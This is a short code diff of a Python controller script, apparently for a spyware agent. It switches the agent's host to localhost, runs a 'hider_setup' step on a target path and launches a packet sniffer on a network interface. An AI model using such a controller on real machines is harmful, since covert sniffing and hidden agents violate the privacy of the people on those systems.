@@ -7,7 +7,8 @@ from time import sleep
 from contParams import *
 from structParams import *
 
-HOST = "192.168.83.131"
+# HOST = "192.168.83.131"
+HOST = "localhost"
 PORT_MANEGER = 65432
 PORT_SPYWARE = 65410
 
@@ -34,8 +35,8 @@ def main():
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
 
-    params = ContParams(SnifferType, Params(SniffParams(5, b"ens33")))
-    print(spyAgent.runContraption(params, 4))
+    params = ContParams(SnifferType, Params(SniffParams(5, b"eth0")))
+    print(spyAgent.runContraption(params, 10))
 
 
 if __name__ == "__main__":
